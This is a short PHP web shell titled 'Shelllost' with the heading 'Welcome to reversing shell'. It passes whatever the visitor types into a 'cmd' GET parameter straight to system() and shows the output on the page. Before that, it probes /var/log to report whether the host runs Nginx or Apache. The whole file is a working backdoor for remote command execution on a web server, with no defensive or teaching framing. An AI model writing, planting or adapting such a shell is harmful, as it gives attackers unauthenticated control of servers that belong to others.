<?php
  $command = isset($_GET['cmd']) ? $_GET['cmd'] : null;
  if ( exec('[ -d /var/log/nginx ] && printf "Nginx" || printf "n"') == "Nginx" ){
    echo 'Nginx';
  }else if ( exec('[ -d /var/log/apache* ] && printf "Apache" || printf "n"') == "Apache" ){
    echo 'Apache';
  }else {
    echo "Não identificado servidor";
  }
?>
<DOCTYPE html>
<html>
  <head>
    <title>Shelllost</title>
    <meta charset="utf-8"/>
  </head>
  <body>
    <h1>Welcome to reversing shell</h1>
    <form method='get' action='#'>
      <input type='text' style='' name='cmd' placeholder='type command, like: ls'/>
      <input type='submit'/>
    </form>

    <div id=out>
      <pre><?= system($command) ?></pre>
    </div>
  </body>
</html>
